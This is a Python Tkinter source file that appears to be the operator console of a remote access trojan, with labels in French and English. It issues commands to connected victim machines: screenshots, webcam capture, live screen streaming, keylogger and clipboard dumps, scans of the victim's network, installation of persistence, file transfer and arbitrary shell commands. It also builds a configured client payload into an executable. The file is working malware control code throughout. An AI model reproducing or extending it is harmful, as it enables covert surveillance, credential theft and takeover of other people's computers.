            r = tk.Frame(body, bg=self.bg_input if active else self.bg_card,
                         highlightbackground=self.accent_color if active else self.border_color,
                         highlightthickness=1)
            r.pack(fill="x", pady=1)
            clr = self.accent_color if active else self.text_color
            for txt, w in ((f"#{cid}", 4), (c["address"][0], 15), (node, 14),
                           (f"{os_name} {release}", 14), (enc, 10)):
                tk.Label(r, text=txt, fg=clr, bg=r.cget("bg"),
                         font=("Consolas", 9), width=w, anchor="w").pack(side="left", padx=3)
            bf = tk.Frame(r, bg=r.cget("bg"))
            bf.pack(side="right", padx=4)
            ttk.Button(bf, text="Sélect.",
                       command=lambda c=cid: (self._select_cid(c), self._toggle_detail("clients"))
                       ).pack(side="left", padx=2)
            ttk.Button(bf, text="Kick", style="Danger.TButton",
                       command=lambda c=cid: (self._kick_cid(c), self._toggle_detail("clients"))
                       ).pack(side="left", padx=2)

    def _render_detail_server(self, body):
        running = self.server_socket is not None
        status_txt = "EN ÉCOUTE" if running else "ARRÊTÉ"
        status_clr = self.success_color if running else self.error_color
        top = tk.Frame(body, bg=self.bg_card)
        top.pack(fill="x", pady=(0, 6))
        tk.Label(top, text=status_txt, fg=status_clr, bg=self.bg_card,
                 font=("Segoe UI", 13, "bold")).pack(side="left")
        tk.Frame(body, bg=self.border_color, height=1).pack(fill="x", pady=(0, 6))
        self._detail_row(body, "Adresse d'écoute", f"{self.server_host.get()}:{self.server_port.get()}")
        self._detail_row(body, "Clients actifs", len(self.clients))
        self._detail_row(body, "Total connexions", self._total_connections)
        if self._server_start_time:
            import datetime
            uptime = int(time.time() - self._server_start_time)
            h, m, s = uptime // 3600, (uptime % 3600) // 60, uptime % 60
            started = datetime.datetime.fromtimestamp(self._server_start_time).strftime("%H:%M:%S")
            self._detail_row(body, "Démarré à", started)
            self._detail_row(body, "Uptime", f"{h:02d}:{m:02d}:{s:02d}")
        else:
            self._detail_row(body, "Démarré à", "—")

    def _render_detail_alerts(self, body):
        top = tk.Frame(body, bg=self.bg_card)
        top.pack(fill="x", pady=(0, 6))
        tk.Label(top, text=f"{self._alert_count} alerte(s)", fg=self.warning_color,
                 bg=self.bg_card, font=("Segoe UI", 9, "bold")).pack(side="left")
        ttk.Button(top, text="Effacer", style="Danger.TButton",
                   command=self._clear_alerts).pack(side="right")
        frame = tk.Frame(body, bg=self.bg_console,
                         highlightbackground=self.border_color, highlightthickness=1)
        frame.pack(fill="both", expand=True)
        txt = tk.Text(frame, bg=self.bg_console, fg=self.text_color,
                      font=("Consolas", 9), relief="flat", wrap="word",
                      height=6, borderwidth=0, highlightthickness=0)
        sb = tk.Scrollbar(frame, orient="vertical", command=txt.yview,
                          bg=self.bg_sidebar, troughcolor=self.bg_main)
        sb.pack(side="right", fill="y")
        txt.config(yscrollcommand=sb.set)
        txt.pack(fill="both", expand=True, padx=4, pady=4)
        lvl_colors = {"error": self.error_color, "warning": self.warning_color,
                      "timeout": self.orange_color}
        if not self._alert_log:
            txt.insert("end", "Aucune alerte enregistrée.\n")
        else:
            for ts, msg, level in reversed(self._alert_log):
                txt.insert("end", f"[{ts}] ", "ts")
                txt.insert("end", f"{msg}\n", level)
                txt.tag_config("ts", foreground=self.text_muted)
                txt.tag_config(level, foreground=lvl_colors.get(level, self.text_muted))
        txt.config(state="disabled")

    def _clear_alerts(self):
        self._alert_count = 0
        self._alert_log.clear()
        self._alert_badge.config(text="")
        if hasattr(self, "_stat_alerts"):
            self._stat_alerts.config(text="0")
        if self._detail_panel_active == "alerts":
            self._toggle_detail("alerts")
            self._toggle_detail("alerts")

    def _render_detail_port(self, body):
        running = self.server_socket is not None
        self._detail_row(body, "Port actuel", self.server_port.get())
        tk.Frame(body, bg=self.border_color, height=1).pack(fill="x", pady=(4, 8))
        if running:
            tk.Label(body, text="Arrête le serveur pour modifier le port.",
                     fg=self.warning_color, bg=self.bg_card, font=("Segoe UI", 9)).pack(anchor="w")
            return
        row = tk.Frame(body, bg=self.bg_card)
        row.pack(fill="x", pady=4)
        tk.Label(row, text="Nouveau port", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 9), width=14, anchor="w").pack(side="left")
        var = tk.StringVar(value=str(self.server_port.get()))
        entry = tk.Entry(row, textvariable=var, bg=self.bg_input, fg=self.text_color,
                         insertbackground=self.text_color, relief="flat",
                         font=("Consolas", 10), width=8)
        entry.pack(side="left", padx=(0, 6))
        msg_lbl = tk.Label(body, text="", fg=self.error_color, bg=self.bg_card,
                           font=("Segoe UI", 8))
        msg_lbl.pack(anchor="w")

        def save():
            try:
                p = int(var.get().strip())
                if not (1 <= p <= 65535):
                    raise ValueError
            except ValueError:
                msg_lbl.config(text="Port invalide (1–65535)")
                return
            self.server_port.set(p)
            if hasattr(self, "_stat_port"):
                self._stat_port.config(text=str(p))
            self.log_message(f"Port changé → {p}", "info")
            self._toggle_detail("port")

        btn_row = tk.Frame(body, bg=self.bg_card)
        btn_row.pack(fill="x", pady=(6, 0))
        ttk.Button(btn_row, text="Appliquer", command=save).pack(side="left", padx=(0, 6))
        ttk.Button(btn_row, text="Annuler",
                   command=lambda: self._toggle_detail("port")).pack(side="left")
        entry.bind("<Return>", lambda e: save())
        entry.focus_set()

    def send_command(self, event=None):
        cmd = self.cmd_entry.get().strip()
        if not cmd: return
        self.cmd_entry.delete(0, tk.END)
        if not self.current_client_id:
            self.log_message("No client selected", "error"); return
        self.log_message(f"> {cmd}", "info")

        if cmd in ("screenshot", "webcam", "stream_start"):
            threading.Thread(target=self._handle_special, args=(cmd,), daemon=True).start()
        else:
            threading.Thread(target=self._handle_generic, args=(cmd,), daemon=True).start()

    def _write_terminal(self, text):
        if not hasattr(self, "terminal_out"):
            return
        self.terminal_out.config(state="normal")
        self.terminal_out.insert("end", text + "\n")
        self.terminal_out.see("end")
        self.terminal_out.config(state="disabled")

    def _handle_generic(self, cmd):
        if cmd.startswith("download "):
            self._do_download(cmd)
        elif cmd.startswith("upload "):
            self._do_upload(cmd)
        else:
            resp = self._send_recv(cmd)
            if resp:
                self.root.after(0, lambda r=resp, c=cmd: self._write_terminal(f"$ {c}\n{r}\n"))
                self.root.after(0, lambda r=resp: self.log_message(r, "info"))
                if self.report and cmd not in ("sysinfo", "capabilities", "persist_check", "persist_methods"):
                    self.report.add_command_result(cmd, resp)

    def _handle_special(self, cmd):
        sock, key = self._get_sock_key()
        if not sock:
            self.root.after(0, lambda: self.log_message("No client", "error")); return
        try:
            if cmd == "screenshot":
                send_msg(sock, "screenshot", key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    data = recv_msg(sock, key)
                    if data and PIL_AVAILABLE:
                        img = Image.open(io.BytesIO(data))
                        self.screenshots.append(img)
                        self.current_screenshot_index = len(self.screenshots) - 1
                        self.root.after(0, self._show_screenshot)
                        self.root.after(0, lambda: self.log_message("Screenshot captured", "success"))
                        if self.report: self.report.add_screenshot(f"screenshot_{len(self.screenshots)}.png")
                else:
                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
                    raw_cause = (status or "FAIL").replace("FAIL:", "").strip() if status else ""
                    if raw_cause:
                        cause = raw_cause
                        suggestion = "Voir l'erreur ci-dessus — si pyautogui est absent: pip install pyautogui pillow"
                    else:
                        cause = "pyautogui absent ou erreur inconnue"
                        suggestion = "pip install pyautogui pillow sur le client cible"
                    self.root.after(0, lambda c=cause, s=suggestion: self.log_message(
                        "Screenshot échoué", "error",
                        client_ip=cip, operation="capture_ecran",
                        cause=c, suggestion=s
                    ))

            elif cmd == "webcam":
                send_msg(sock, "webcam", key)
                status = recv_msg_str(sock, key)
                if status == "PASS":
                    data = recv_msg(sock, key)
                    if data and PIL_AVAILABLE:
                        img = Image.open(io.BytesIO(data))
                        self.webcam_images.append(img)
                        self.current_webcam_index = len(self.webcam_images) - 1
                        self.root.after(0, self._show_webcam)
                        self.root.after(0, lambda: self.log_message("Webcam captured", "success"))
                else:
                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
                    self.root.after(0, lambda: self.log_message(
                        "Webcam échouée", "error",
                        client_ip=cip, operation="capture_webcam",
                        cause="Réponse FAIL du client (opencv-python peut-être absent)",
                        suggestion="pip install opencv-python sur le client cible"
                    ))

            elif cmd == "stream_start":
                self.streaming = True
                send_msg(sock, "stream_start", key)
                status = recv_msg_str(sock, key)
                if status != "PASS":
                    self.streaming = False
                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
                    self.root.after(0, lambda: self.log_message(
                        "Stream échoué", "error",
                        client_ip=cip, operation="stream_start",
                        cause="Réponse FAIL du client (pyautogui/PIL peut-être absent)",
                        suggestion="pip install pyautogui pillow sur le client cible"
                    ))
                    return
                self.root.after(0, lambda: (self.stream_start_btn.config(state="disabled"), self.stream_stop_btn.config(state="normal")))
                self.root.after(0, lambda: self.log_message("Stream started", "success"))
                frame_count = 0
                start_time = time.time()
                while self.streaming:
                    frame_data = recv_msg(sock, key)
                    if not frame_data or frame_data == b"STREAM_END":
                        break
                    if PIL_AVAILABLE:
                        try:
                            img = Image.open(io.BytesIO(frame_data))
                            self.root.after(0, lambda i=img: self._show_stream_frame(i))
                        except:
                            pass
                    frame_count += 1
                    elapsed = time.time() - start_time
                    if elapsed > 0:
                        fps = frame_count / elapsed
                        self.root.after(0, lambda f=fps: self.stream_fps_label.config(text=f"FPS: {f:.1f}"))
                    send_msg(sock, "NEXT", key)
                # Tell client to stop and drain its STREAM_END so the socket is clean
                try:
                    send_msg(sock, "STOP", key)
                    # Drain any remaining frame or the STREAM_END the client sends back
                    tail = recv_msg(sock, key)
                    if tail and tail != b"STREAM_END":
                        # One more frame arrived before STOP was processed — drain it
                        send_msg(sock, "STOP", key)
                        recv_msg(sock, key)
                except Exception:
                    pass
                self.root.after(0, lambda: (self.stream_start_btn.config(state="normal"), self.stream_stop_btn.config(state="disabled")))
        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda: self.log_message(f"Error: {err_msg}", "error"))

    def _cmd_thread(self, cmd):
        if not self.current_client_id:
            self.log_message("No client selected", "error"); return
        threading.Thread(target=lambda: self._generic_cmd_display(cmd), daemon=True).start()

    def _generic_cmd_display(self, cmd):
        resp = self._send_recv(cmd)
        if resp:
            self.root.after(0, lambda: self.log_message(resp, "info"))

    # ─── Stream ───────────────────────────────────────────

    def start_stream(self):
        if not self.current_client_id:
            self.log_message("No client", "error"); return
        self.cmd_entry.delete(0, tk.END)
        threading.Thread(target=self._handle_special, args=("stream_start",), daemon=True).start()

    def stop_stream(self):
        self.streaming = False

    def _show_stream_frame(self, img):
        cw = self.stream_canvas.winfo_width()
        ch = self.stream_canvas.winfo_height()
        if cw < 50: cw, ch = 800, 500
        iw, ih = img.size
        scale = min(cw / iw, ch / ih)
        resized = img.resize((int(iw * scale), int(ih * scale)), Image.LANCZOS)
        self.stream_photo = ImageTk.PhotoImage(resized)
        self.stream_canvas.delete("all")
        self.stream_canvas.create_image(cw // 2, ch // 2, image=self.stream_photo, anchor="center")

    # ─── Screenshots ─────────────────────────────────────

    def capture_screenshot(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        threading.Thread(target=self._handle_special, args=("screenshot",), daemon=True).start()

    def _show_screenshot(self):
        if not self.screenshots: return
        img = self.screenshots[self.current_screenshot_index]
        cw, ch = self.ss_canvas.winfo_width(), self.ss_canvas.winfo_height()
        if cw < 50: cw, ch = 800, 500
        scale = min(cw / img.width, ch / img.height)
        resized = img.resize((int(img.width * scale), int(img.height * scale)), Image.LANCZOS)
        self.screenshot_photo = ImageTk.PhotoImage(resized)
        self.ss_canvas.delete("all")
        self.ss_canvas.create_image(cw // 2, ch // 2, image=self.screenshot_photo, anchor="center")
        self.ss_label.config(text=f"{self.current_screenshot_index + 1}/{len(self.screenshots)}")

    def save_screenshot(self):
        if not self.screenshots: return
        p = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG", "*.png")])
        if p: self.screenshots[self.current_screenshot_index].save(p)

    def prev_screenshot(self):
        if self.screenshots:
            self.current_screenshot_index = (self.current_screenshot_index - 1) % len(self.screenshots)
            self._show_screenshot()

    def next_screenshot(self):
        if self.screenshots:
            self.current_screenshot_index = (self.current_screenshot_index + 1) % len(self.screenshots)
            self._show_screenshot()

    # ─── Webcam ──────────────────────────────────────────

    def capture_webcam(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        threading.Thread(target=self._handle_special, args=("webcam",), daemon=True).start()

    def _show_webcam(self):
        if not self.webcam_images: return
        img = self.webcam_images[self.current_webcam_index]
        cw, ch = self.wc_canvas.winfo_width(), self.wc_canvas.winfo_height()
        if cw < 50: cw, ch = 800, 500
        scale = min(cw / img.width, ch / img.height)
        resized = img.resize((int(img.width * scale), int(img.height * scale)), Image.LANCZOS)
        self.webcam_photo = ImageTk.PhotoImage(resized)
        self.wc_canvas.delete("all")
        self.wc_canvas.create_image(cw // 2, ch // 2, image=self.webcam_photo, anchor="center")
        self.wc_label.config(text=f"{self.current_webcam_index + 1}/{len(self.webcam_images)}")

    def save_webcam(self):
        if not self.webcam_images: return
        p = filedialog.asksaveasfilename(defaultextension=".jpg", filetypes=[("JPEG", "*.jpg")])
        if p: self.webcam_images[self.current_webcam_index].save(p)

    def _nav_webcam(self, d):
        if self.webcam_images:
            self.current_webcam_index = (self.current_webcam_index + d) % len(self.webcam_images)
            self._show_webcam()

    # ─── Keylogger ───────────────────────────────────────

    def dump_keylogger(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("keylogger_dump")
            if resp:
                self.root.after(0, lambda: (self.keylog_text.delete("1.0", tk.END), self.keylog_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    def save_keylogger(self):
        data = self.keylog_text.get("1.0", tk.END).strip()
        if not data: return
        p = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if p:
            with open(p, "w") as f: f.write(data)

    # ─── Clipboard ───────────────────────────────────────

    def dump_clipboard(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("clipboard_dump")
            if resp:
                self.root.after(0, lambda: (self.clipboard_text.delete("1.0", tk.END), self.clipboard_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    def get_current_clipboard(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("clipboard_current")
            if resp:
                self.root.after(0, lambda: (self.clipboard_text.delete("1.0", tk.END), self.clipboard_text.insert(tk.END, f"Current clipboard:\n{resp}")))
        threading.Thread(target=do, daemon=True).start()

    # ─── Network Scanner ─────────────────────────────────

    def do_network_scan(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        self.scanner_text.delete("1.0", tk.END)
        self.scanner_text.insert(tk.END, "Scanning... (may take 30-60 seconds)\n")
        def do():
            sock, key = self._get_sock_key()
            if not sock: return
            try:
                send_msg(sock, "scan_network", key)
                progress = recv_msg_str(sock, key)
                self.root.after(0, lambda: self.scanner_text.insert(tk.END, f"{progress}\n"))
                send_msg(sock, "ACK", key)
                result = recv_msg_str(sock, key)
                self.root.after(0, lambda: (self.scanner_text.delete("1.0", tk.END), self.scanner_text.insert(tk.END, result)))
                if self.report: self.report.add_network_finding(result[:500])
            except Exception as e:
                err_msg = str(e)
                self.root.after(0, lambda: self.log_message(f"Scan error: {err_msg}", "error"))
        threading.Thread(target=do, daemon=True).start()

    def do_port_scan(self):
        target = self.scan_target.get().strip()
        if not target:
            self.log_message("Enter target IP", "warning"); return
        if not self.current_client_id: self.log_message("No client", "error"); return
        self.scanner_text.delete("1.0", tk.END)
        self.scanner_text.insert(tk.END, f"Port scanning {target}...\n")
        def do():
            resp = self._send_recv(f"scan_ports {target}")
            if resp:
                self.root.after(0, lambda: (self.scanner_text.delete("1.0", tk.END), self.scanner_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    def do_arp_scan(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("scan_arp")
            if resp:
                self.root.after(0, lambda: (self.scanner_text.delete("1.0", tk.END), self.scanner_text.insert(tk.END, resp)))
        threading.Thread(target=do, daemon=True).start()

    # ─── Persistence ─────────────────────────────────────

    def install_specific_persist(self):
        method = self.persist_method.get().strip()
        if not method: self.log_message("Enter a method name", "warning"); return
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv(f"persist_install {method}")
            if resp:
                self.root.after(0, lambda: (self.persist_text.delete("1.0", tk.END), self.persist_text.insert(tk.END, resp)))
                self.root.after(0, lambda: self.log_message(resp, "info"))
                if self.report and "[+]" in resp: self.report.add_persistence(method, True)
        threading.Thread(target=do, daemon=True).start()

    # ─── System Info ─────────────────────────────────────

    def get_system_info(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("sysinfo")
            if resp:
                formatted = "=== System Information ===\n\n"
                for part in resp.split("|"):
                    p = part.strip()
                    if ":" in p:
                        k, v = p.split(":", 1)
                        formatted += f"  {k.strip():15s}: {v.strip()}\n"
                self.root.after(0, lambda: (self.sysinfo_text.config(state="normal"), self.sysinfo_text.delete("1.0", tk.END), self.sysinfo_text.insert(tk.END, formatted), self.sysinfo_text.config(state="disabled")))
        threading.Thread(target=do, daemon=True).start()

    def get_capabilities(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        def do():
            resp = self._send_recv("capabilities")
            if resp:
                try:
                    caps = json.loads(resp)
                    text = "=== Client Capabilities ===\n\n"
                    for k, v in caps.items():
                        status = "YES" if v is True else ("NO" if v is False else str(v))
                        text += f"  {k:15s}: {status}\n"
                    self.root.after(0, lambda: (self.sysinfo_text.config(state="normal"), self.sysinfo_text.delete("1.0", tk.END), self.sysinfo_text.insert(tk.END, text), self.sysinfo_text.config(state="disabled")))
                except:
                    self.root.after(0, lambda: self.log_message(resp, "info"))
        threading.Thread(target=do, daemon=True).start()

    # ─── File Operations ─────────────────────────────────

    def browse_local_dir(self):
        d = filedialog.askdirectory(initialdir=self.local_path_var.get())
        if d:
            self.local_path_var.set(d)
            self.refresh_local_files()

    def refresh_local_files(self):
        self.local_files.delete(0, tk.END)
        path = self.local_path_var.get()
        if not os.path.isdir(path):
            return
        try:
            items = sorted(os.listdir(path), key=lambda x: (not os.path.isdir(os.path.join(path, x)), x.lower()))
            for item in items:
                full = os.path.join(path, item)
                if os.path.isdir(full):
                    self.local_files.insert(tk.END, f"[DIR]  {item}")
                else:
                    try:
                        size = os.path.getsize(full)
                        size_str = f"{size:,}" if size < 1024*1024 else f"{size/1024/1024:.1f} MB"
                    except OSError:
                        size_str = "?"
                    self.local_files.insert(tk.END, f"       {item}  ({size_str})")
        except Exception:
            pass

    def _local_navigate(self, event=None):
        sel = self.local_files.curselection()
        if not sel:
            return
        text = self.local_files.get(sel[0]).strip()
        if not text.startswith("[DIR]"):
            return
        name = text[5:].strip()
        new_path = os.path.join(self.local_path_var.get(), name)
        if os.path.isdir(new_path):
            self.local_path_var.set(os.path.normpath(new_path))
            self.refresh_local_files()

    def _local_go_up(self):
        current = self.local_path_var.get()
        parent = os.path.dirname(current)
        if parent and parent != current:
            self.local_path_var.set(parent)
            self.refresh_local_files()

    def list_remote_files(self):
        if not self.current_client_id:
            self.log_message("No client", "error"); return
        path = self.remote_path_var.get() or "."
        def do():
            resp = self._send_recv(f"listdir {path}")
            if resp:
                self.root.after(0, lambda: self._fill_remote_list(resp))
        threading.Thread(target=do, daemon=True).start()

    def _fill_remote_list(self, data):
        self.remote_files.delete(0, tk.END)
        dirs = []
        files = []
        for line in data.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            if line.startswith("[DIR]"):
                dirs.append(line)
            else:
                files.append(line)
        for entry in dirs + files:
            self.remote_files.insert(tk.END, entry)

    def _remote_navigate(self, event=None):
        sel = self.remote_files.curselection()
        if not sel:
            return
        text = self.remote_files.get(sel[0]).strip()
        if not text.startswith("[DIR]"):
            return
        name = text[5:].strip()
        current = self.remote_path_var.get().rstrip("/").rstrip("\\")
        # Build new path — let the client OS resolve it
        sep = "\\" if "\\" in current or (len(current) >= 2 and current[1] == ":") else "/"
        new_path = current + sep + name if current not in (".", "") else name
        self.remote_path_var.set(new_path)
        self.list_remote_files()

    def _remote_go_up(self):
        if not self.current_client_id:
            self.log_message("No client", "error"); return
        current = self.remote_path_var.get()
        def do():
            # Ask client for the parent of the current path
            resp = self._send_recv(f"cd_parent {current}")
            if resp and not resp.startswith("[!]"):
                self.root.after(0, lambda: (
                    self.remote_path_var.set(resp.strip()),
                    self.list_remote_files()
                ))
            else:
                # Fallback: strip last component locally
                for sep in ("\\", "/"):
                    if sep in current:
                        parent = current.rsplit(sep, 1)[0] or sep
                        self.root.after(0, lambda p=parent: (
                            self.remote_path_var.set(p),
                            self.list_remote_files()
                        ))
                        return
        threading.Thread(target=do, daemon=True).start()

    def upload_file(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        sel = self.local_files.curselection()
        if not sel: self.log_message("Select a file", "warning"); return
        text = self.local_files.get(sel[0]).strip()
        if text.startswith("[DIR]"): self.log_message("Sélectionne un fichier, pas un dossier", "warning"); return
        name = text.lstrip().split("  ")[0].strip()
        filepath = os.path.join(self.local_path_var.get(), name)
        threading.Thread(target=self._do_upload, args=(f"upload {filepath}",), daemon=True).start()

    def download_file(self):
        if not self.current_client_id: self.log_message("No client", "error"); return
        sel = self.remote_files.curselection()
        if not sel: self.log_message("Select a file", "warning"); return
        text = self.remote_files.get(sel[0]).strip()
        if text.startswith("[DIR]"): self.log_message("Sélectionne un fichier, pas un dossier", "warning"); return
        name = text.split(" (")[0].strip() if " (" in text else text.strip()
        threading.Thread(target=self._do_download, args=(f"download {name}",), daemon=True).start()

    def _do_upload(self, cmd):
        parts = cmd.split(" ", 1)
        filepath = parts[1]
        if not os.path.isfile(filepath):
            self.root.after(0, lambda: self.log_message(f"Not found: {filepath}", "error")); return
        sock, key = self._get_sock_key()
        if not sock: return
        try:
            with open(filepath, "rb") as f: data = f.read()
            send_msg(sock, f"upload {os.path.basename(filepath)}", key)
            send_msg(sock, data, key)
            resp = recv_msg_str(sock, key)
            self.root.after(0, lambda: self.log_message(resp or "Upload done", "success"))
            if self.report: self.report.add_file_access("upload", filepath)
        except Exception as e:
            ip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            err_msg = str(e)
            self.root.after(0, lambda: self.log_message(
                "Erreur upload", "error",
                client_ip=ip, operation=f"upload {os.path.basename(filepath)}",
                cause=err_msg,
                suggestion="Vérifier les permissions sur le client et la connexion réseau"
            ))

    def _do_download(self, cmd):
        remote = cmd.split(" ", 1)[1]
        sock, key = self._get_sock_key()
        if not sock: return
        try:
            send_msg(sock, f"download {remote}", key)
            status = recv_msg_str(sock, key)
            if status == "FAIL":
                ip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
                self.root.after(0, lambda: self.log_message(
                    "Fichier introuvable", "error",
                    client_ip=ip, operation=f"download {remote}",
                    cause=f"Le client ne trouve pas: {remote}",
                    suggestion="Vérifier le chemin exact avec 'listdir' dans Terminal"
                ))
                return
            data = recv_msg(sock, key)
            if data:
                local = os.path.basename(remote)
                with open(local, "wb") as f: f.write(data)
                self.root.after(0, lambda: self.log_message(f"Downloaded: {local} ({len(data)} bytes)", "success"))
                if self.report: self.report.add_file_access("download", remote)
        except Exception as e:
            ip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
            err_msg = str(e)
            self.root.after(0, lambda: self.log_message(
                "Erreur download", "error",
                client_ip=ip, operation=f"download {remote}",
                cause=err_msg,
                suggestion="Vérifier les permissions sur le fichier distant"
            ))

    # ─── Report ──────────────────────────────────────────

    def generate_report(self):
        if not self.report:
            self.log_message("Report module unavailable (pip install fpdf2)", "error"); return
        text = self.report.generate_text_report()
        self.report_text.config(state="normal")
        self.report_text.delete("1.0", tk.END)
        self.report_text.insert(tk.END, text)
        self.report_text.config(state="disabled")
        self.log_message("Report generated - see Report tab", "success")

    def export_report_pdf(self):
        if not self.report: return
        path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF", "*.pdf")])
        if path:
            result = self.report.generate_pdf_report(path)
            self.log_message(f"Report exported: {result}", "success")

    def export_report_text(self):
        if not self.report: return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if path:
            with open(path, "w") as f: f.write(self.report.generate_text_report())
            self.log_message(f"Report saved: {path}", "success")

    # ─── Utilities ───────────────────────────────────────

    def _section_header(self, parent, title, subtitle=None):
        hdr = tk.Frame(parent, bg=self.bg_main)
        hdr.pack(fill="x", pady=(0, 10))
        tk.Label(hdr, text=title, fg=self.accent_color, bg=self.bg_main,
                 font=("Segoe UI", 13, "bold")).pack(side="left")
        if subtitle:
            tk.Label(hdr, text=subtitle, fg=self.text_muted, bg=self.bg_main,
                     font=("Segoe UI", 9)).pack(side="left", padx=10)
        return hdr

    def _make_text_area(self, parent, readonly=True):
        frame = tk.Frame(parent, bg=self.bg_card,
                          highlightbackground=self.border_color, highlightthickness=1)
        frame.pack(fill="both", expand=True)
        text = tk.Text(frame, bg=self.bg_console, fg=self.text_color,
                       font=("Consolas", 9), borderwidth=0, highlightthickness=0,
                       wrap="word")
        if readonly:
            text.config(state="disabled")
        sb = tk.Scrollbar(frame, orient="vertical", command=text.yview)
        sb.pack(side="right", fill="y")
        text.config(yscrollcommand=sb.set)
        text.pack(fill="both", expand=True, padx=6, pady=6)
        return text

    def _update_indicator(self, status):
        colors  = {"idle": self.error_color, "listening": self.warning_color, "connected": self.success_color}
        labels  = {"idle": "● ARRÊTÉ", "listening": f"● ÉCOUTE :{self.server_port.get()}", "connected": "● ACTIF"}
        srv_val = {"idle": "OFF", "listening": "ON", "connected": "ON"}
        srv_clr = {"idle": self.error_color, "listening": self.warning_color, "connected": self.success_color}
        badge_fg = colors.get(status, self.error_color)
        self._status_badge.config(text=labels.get(status, ""), fg=badge_fg)
        self._port_badge.config(text=f":{self.server_port.get()}")
        n = len(self.clients)
        if hasattr(self, "_stat_clients"):
            self._stat_clients.config(text=str(n))
            self._stat_server.config(text=srv_val.get(status, "OFF"), fg=srv_clr.get(status, self.error_color))
        self._clients_badge.config(text=f"{n} client{'s' if n != 1 else ''}")
        self.count_var.set(f"Clients: {n}")

    def _pulse_status(self):
        if not hasattr(self, "_status_badge"):
            return
        txt = self._status_badge.cget("text")
        if "ACTIF" in txt or "ÉCOUTE" in txt:
            current = self._status_badge.cget("fg")
            toggle = self.success_color if current == self.text_muted else self.text_muted
            self._status_badge.config(fg=toggle)
            self.root.after(1000, self._pulse_status)

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]; s.close(); return ip
        except: return "127.0.0.1"

    def show_ip_info(self):
        ip = self.get_local_ip()
        messagebox.showinfo("IP Info", f"LAN IP: {ip}\nHostname: {socket.gethostname()}\nListen on 0.0.0.0 for all interfaces")

    def _generate_client(self, ip, port):
        template = "client_template.py"
        if not os.path.exists(template):
            if os.path.exists("client.py"): shutil.copy("client.py", template)
            else: return False
        with open(template, 'r', encoding='utf-8') as f: content = f.read()
        content = re.sub(r'SERVER_HOST\s*=\s*["\'].*?["\']', f'SERVER_HOST = "{ip}"', content)
        content = re.sub(r'SERVER_PORT\s*=\s*\d+', f'SERVER_PORT = {port}', content)
        content = re.sub(r'AUTH_USERNAME\s*=\s*["\'].*?["\']', f'AUTH_USERNAME = "{self.auth_username_var.get()}"', content)
        content = re.sub(r'AUTH_PASSWORD\s*=\s*["\'].*?["\']', f'AUTH_PASSWORD = "{self.auth_password_var.get()}"', content)
        with open("client_gen.py", 'w', encoding='utf-8') as f: f.write(content)
        return True

    def manual_generate_client(self):
        ip = self.get_local_ip() if self.lan_mode_var.get() else "127.0.0.1"
        if self._generate_client(ip, self.server_port.get()):
            self.log_message(f"client_gen.py generated -> {ip}:{self.server_port.get()}", "success")
            messagebox.showinfo("OK", f"client_gen.py generated\nIP: {ip}  Port: {self.server_port.get()}")
            if self.build_exe_var.get():
                self.build_client_executable()
        else:
            messagebox.showerror("Error", "Failed to generate client. Check logs.")

    def _build_progress_show(self):
        self._build_progress_frame.pack(fill="x", padx=10, pady=(0, 6))
        self._build_log.config(state="normal")
        self._build_log.delete("1.0", tk.END)
        self._build_log.config(state="disabled")
        self._build_pct_lbl.config(text="")
        self._build_status_lbl.config(text="⏳ Compilation en cours…", fg=self.warning_color)
        self._build_progressbar.config(mode="indeterminate")
        self._build_progressbar.start(12)
        self._build_btn.config(state="disabled")

    def _build_progress_hide(self, success=True):
        self._build_progressbar.stop()
        if success:
            self._build_progressbar.config(mode="determinate", value=100)
            self._build_status_lbl.config(text="✓ Build terminé", fg=self.success_color)
        else:
            self._build_progressbar.config(mode="determinate", value=0)
            self._build_status_lbl.config(text="✕ Build échoué", fg=self.error_color)
        self._build_btn.config(state="normal")

    def _build_log_append(self, line):
        self._build_log.config(state="normal")
        self._build_log.insert(tk.END, line + "\n")
        self._build_log.see(tk.END)
        self._build_log.config(state="disabled")

    def _build_update_phase(self, line):
        # Extrait les phases PyInstaller pour afficher un statut lisible
        line_lower = line.lower()
        if "analysis" in line_lower or "analysing" in line_lower:
            self._build_status_lbl.config(text="🔍 Analyse des dépendances…", fg=self.warning_color)
            self._build_pct_lbl.config(text="25%")
        elif "collecting" in line_lower or "building" in line_lower:
            self._build_status_lbl.config(text="📦 Collecte des modules…", fg=self.warning_color)
            self._build_pct_lbl.config(text="50%")
        elif "exe" in line_lower or "onefile" in line_lower or "packing" in line_lower or "append" in line_lower:
            self._build_status_lbl.config(text="🔧 Assemblage de l'exécutable…", fg=self.warning_color)
